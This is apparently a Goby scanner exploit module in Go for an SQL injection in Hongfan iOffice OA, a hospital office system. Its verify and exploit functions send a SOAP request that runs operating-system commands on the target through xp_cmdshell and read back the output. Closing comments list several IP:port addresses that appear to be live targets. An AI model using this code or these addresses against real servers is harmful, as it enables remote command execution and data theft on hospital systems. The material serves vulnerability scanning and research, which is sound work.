package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "iOffice OA ioAssistance2.asmx SQL Injection Vulnerability",
    "Description": "<p>Hongfan OA is an oA function that provides hospitals with information release, process approval, document management, schedule management, work arrangement, file delivery, online communication and other administrative office services.</p><p>There is a SQL injection vulnerability in the Hongfan OA ioAssistance2.asmx file. An attacker can obtain information such as database passwords and execute commands to obtain server permissions.</p>",
    "Product": "ioffice",
    "Homepage": "http://www.ioffice.cn/",
    "DisclosureDate": "2023-02-10",
    "Author": "h1ei1",
    "FofaQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "GobyQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in the Hongfan OA ioAssistance2.asmx file. An attacker can obtain information such as database passwords and execute commands to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"http://www.ioffice.cn/.\">http://www.ioffice.cn/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "红帆-ioffice ioAssistance2.asmx 文件 SQL 注入漏洞",
            "Product": "红帆-ioffice",
            "Description": "<p>红帆OA 是一款为医院提供OA功能,完成信息发布、流程审批、公文管理、日程管理、工作安排、文件传递、在线沟通等行政办公业务。</p><p>红帆OA ioAssistance2.asmx文件存在SQL注入漏洞，攻击者可获取数据库密码等信息以及执行命令获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁请及时关注官网更新：<a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a>。<br></p>",
            "Impact": "<p>红帆OA ioAssistance2.asmx文件存在SQL注入漏洞，攻击者可获取数据库密码等信息以及执行命令获取服务器权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "iOffice OA ioAssistance2.asmx SQL Injection Vulnerability",
            "Product": "ioffice",
            "Description": "<p>Hongfan OA is an oA function that provides hospitals with information release, process approval, document management, schedule management, work arrangement, file delivery, online communication and other administrative office services.</p><p>There is a SQL injection vulnerability in the Hongfan OA ioAssistance2.asmx file. An attacker can obtain information such as database passwords and execute commands to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"http://www.ioffice.cn/.\">http://www.ioffice.cn/.</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the Hongfan OA ioAssistance2.asmx file. An attacker can obtain information such as database passwords and execute commands to obtain server permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10802"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			randNum1 := 100000 + rand.Intn(10000)
			randNum2 := 50000 + rand.Intn(10000)
			uri := "/ioffice/prg/set/wss/ioAssistance2.asmx"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "text/xml; charset=utf-8")
			cfg.Header.Store("Soapaction", "\"http://tempuri.org/GetLoginedEmpNoReadedInf\"")
			cfg.Data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001\r\n/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n <soap:Body>\r\n <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n <sql>exec master.dbo.xp_cmdshell 'set /a %d + %d'</sql>\r\n </GetLoginedEmpNoReadedInf>\r\n </soap:Body>\r\n</soap:Envelope>", randNum1, randNum2)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {

				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "<output>") && strings.Contains(resp.RawBody, strconv.Itoa(randNum1+randNum2))

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/ioffice/prg/set/wss/ioAssistance2.asmx"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "text/xml; charset=utf-8")
			cfg.Header.Store("Soapaction", "\"http://tempuri.org/GetLoginedEmpNoReadedInf\"")
			cfg.Data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001\r\n/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n <soap:Body>\r\n <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n <sql>exec master.dbo.xp_cmdshell '%s'</sql>\r\n </GetLoginedEmpNoReadedInf>\r\n </soap:Body>\r\n</soap:Envelope>", cmd)

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				out := regexp.MustCompile("<output>(.*?)</output>").FindStringSubmatch(resp.RawBody)
				expResult.Output = out[1]
				expResult.Success = true
			}

			return expResult
		},
	))
}
//182.150.22.51:89
//121.26.195.14:8083
//61.185.131.182:8010
//红帆OA重点产品